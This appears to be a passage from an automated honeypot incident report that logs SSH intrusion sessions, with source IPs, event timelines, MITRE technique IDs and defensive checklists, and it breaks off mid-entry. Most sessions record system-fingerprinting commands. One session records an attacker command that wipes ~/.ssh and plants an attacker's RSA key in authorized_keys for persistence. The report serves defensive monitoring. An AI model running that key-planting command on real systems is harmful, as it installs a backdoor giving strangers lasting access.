| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 06:01 |
| **Last Seen** | 2026-07-04 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:01:09` | `cowrie.session.connect` |
| `2026-07-04 06:01:09` | `cowrie.client.version` |
| `2026-07-04 06:01:09` | `cowrie.client.kex` |
| `2026-07-04 06:01:10` | `cowrie.login.success` |
| `2026-07-04 06:01:10` | `cowrie.session.params` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.success` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:10` | `cowrie.command.input` |
| `2026-07-04 06:01:11` | `cowrie.log.closed` |
| `2026-07-04 06:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8033ad2f04c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 06:01 |
| **Last Seen** | 2026-07-04 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:01:36` | `cowrie.session.connect` |
| `2026-07-04 06:01:36` | `cowrie.client.version` |
| `2026-07-04 06:01:36` | `cowrie.client.kex` |
| `2026-07-04 06:01:36` | `cowrie.login.success` |
| `2026-07-04 06:01:37` | `cowrie.session.params` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.success` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.command.input` |
| `2026-07-04 06:01:37` | `cowrie.log.closed` |
| `2026-07-04 06:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef784198e644

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 06:04 |
| **Last Seen** | 2026-07-04 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:04:44` | `cowrie.session.connect` |
| `2026-07-04 06:04:44` | `cowrie.client.version` |
| `2026-07-04 06:04:44` | `cowrie.client.kex` |
| `2026-07-04 06:04:45` | `cowrie.login.success` |
| `2026-07-04 06:04:46` | `cowrie.session.params` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.success` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.command.input` |
| `2026-07-04 06:04:46` | `cowrie.log.closed` |
| `2026-07-04 06:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa6b14e21a7

| Field | Detail |
|---|---|
| **Source IP** | `130.211.52[.]176` |
| **First Seen** | 2026-07-04 06:04 |
| **Last Seen** | 2026-07-04 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:04:51` | `cowrie.session.connect` |
| `2026-07-04 06:04:51` | `cowrie.client.version` |
| `2026-07-04 06:04:51` | `cowrie.client.kex` |
| `2026-07-04 06:04:54` | `cowrie.login.success` |
| `2026-07-04 06:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.52[.]176` to AbuseIPDB if not already reported
- [ ] Block `130.211.52[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688b4e9bba1d

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-07-04 06:06 |
| **Last Seen** | 2026-07-04 06:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:06:35` | `cowrie.session.connect` |
| `2026-07-04 06:06:35` | `cowrie.client.version` |
| `2026-07-04 06:06:35` | `cowrie.client.kex` |
| `2026-07-04 06:06:36` | `cowrie.login.success` |
| `2026-07-04 06:06:36` | `cowrie.session.params` |
| `2026-07-04 06:06:36` | `cowrie.command.input` |
| `2026-07-04 06:06:36` | `cowrie.command.failed` |
| `2026-07-04 06:06:37` | `cowrie.log.closed` |
| `2026-07-04 06:06:37` | `cowrie.session.params` |
| `2026-07-04 06:06:37` | `cowrie.command.input` |
| `2026-07-04 06:06:38` | `cowrie.session.file_download` |
| `2026-07-04 06:06:38` | `cowrie.log.closed` |
| `2026-07-04 06:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa26d1bf3bc

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-07-04 06:06 |
| **Last Seen** | 2026-07-04 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:06:38` | `cowrie.session.connect` |
| `2026-07-04 06:06:38` | `cowrie.client.version` |
| `2026-07-04 06:06:38` | `cowrie.client.kex` |
| `2026-07-04 06:06:38` | `cowrie.login.success` |
| `2026-07-04 06:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60932f6c31e4

| Field | Detail |
|---|---|
| **Source IP** | `181.191.194[.]175` |
| **First Seen** | 2026-07-04 06:06 |
| **Last Seen** | 2026-07-04 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:06:39` | `cowrie.session.connect` |
| `2026-07-04 06:06:39` | `cowrie.client.version` |
| `2026-07-04 06:06:39` | `cowrie.client.kex` |
| `2026-07-04 06:06:39` | `cowrie.login.success` |
| `2026-07-04 06:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.191.194[.]175` to AbuseIPDB if not already reported
- [ ] Block `181.191.194[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3490265bd3f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 06:08 |
| **Last Seen** | 2026-07-04 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:08:29` | `cowrie.session.connect` |
| `2026-07-04 06:08:29` | `cowrie.client.version` |
| `2026-07-04 06:08:29` | `cowrie.client.kex` |
| `2026-07-04 06:08:29` | `cowrie.login.success` |
| `2026-07-04 06:08:30` | `cowrie.session.params` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.success` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.command.input` |
| `2026-07-04 06:08:30` | `cowrie.log.closed` |
| `2026-07-04 06:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e2b4426a100

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 06:08 |
| **Last Seen** | 2026-07-04 06:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:08:49` | `cowrie.session.connect` |
| `2026-07-04 06:08:50` | `cowrie.client.version` |
| `2026-07-04 06:08:50` | `cowrie.client.kex` |
| `2026-07-04 06:08:56` | `cowrie.login.success` |
| `2026-07-04 06:09:00` | `cowrie.session.params` |
| `2026-07-04 06:09:00` | `cowrie.command.input` |
| `2026-07-04 06:09:01` | `cowrie.log.closed` |
| `2026-07-04 06:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eacb785be379

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 06:08 |
| **Last Seen** | 2026-07-04 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:08:51` | `cowrie.session.connect` |
| `2026-07-04 06:08:51` | `cowrie.client.version` |
| `2026-07-04 06:08:51` | `cowrie.client.kex` |
| `2026-07-04 06:08:51` | `cowrie.login.success` |
| `2026-07-04 06:08:52` | `cowrie.session.params` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.success` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.command.input` |
| `2026-07-04 06:08:52` | `cowrie.log.closed` |
| `2026-07-04 06:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf4e72b2b5a2

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-07-04 06:11 |
| **Last Seen** | 2026-07-04 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:11:17` | `cowrie.session.connect` |
| `2026-07-04 06:11:17` | `cowrie.client.version` |
| `2026-07-04 06:11:17` | `cowrie.client.kex` |
| `2026-07-04 06:11:17` | `cowrie.login.success` |
| `2026-07-04 06:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a2ef2ed297

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 06:12 |
| **Last Seen** | 2026-07-04 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:12:03` | `cowrie.session.connect` |
| `2026-07-04 06:12:03` | `cowrie.client.version` |
| `2026-07-04 06:12:04` | `cowrie.client.kex` |
| `2026-07-04 06:12:04` | `cowrie.login.success` |
| `2026-07-04 06:12:05` | `cowrie.session.params` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.success` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.command.input` |
| `2026-07-04 06:12:05` | `cowrie.log.closed` |
| `2026-07-04 06:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04db0bef064

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 06:15 |
| **Last Seen** | 2026-07-04 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:15:51` | `cowrie.session.connect` |
| `2026-07-04 06:15:51` | `cowrie.client.version` |
| `2026-07-04 06:15:51` | `cowrie.client.kex` |
| `2026-07-04 06:15:51` | `cowrie.login.success` |
| `2026-07-04 06:15:52` | `cowrie.session.params` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.success` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.command.input` |
| `2026-07-04 06:15:52` | `cowrie.log.closed` |
| `2026-07-04 06:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f376e5fc79

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 06:15 |
| **Last Seen** | 2026-07-04 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:15:57` | `cowrie.session.connect` |
| `2026-07-04 06:15:57` | `cowrie.client.version` |
| `2026-07-04 06:15:57` | `cowrie.client.kex` |
| `2026-07-04 06:15:58` | `cowrie.login.success` |
| `2026-07-04 06:15:59` | `cowrie.session.params` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.success` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.command.input` |
| `2026-07-04 06:15:59` | `cowrie.log.closed` |
| `2026-07-04 06:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b262925e5fa0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 06:19 |
| **Last Seen** | 2026-07-04 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:19:54` | `cowrie.session.connect` |
| `2026-07-04 06:19:54` | `cowrie.client.version` |
| `2026-07-04 06:19:54` | `cowrie.client.kex` |
| `2026-07-04 06:19:54` | `cowrie.login.success` |
| `2026-07-04 06:19:55` | `cowrie.session.params` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.success` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.command.input` |
| `2026-07-04 06:19:55` | `cowrie.log.closed` |
| `2026-07-04 06:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a0ab64dd25

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 06:20 |
| **Last Seen** | 2026-07-04 06:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:20:31` | `cowrie.session.connect` |
| `2026-07-04 06:20:32` | `cowrie.client.version` |
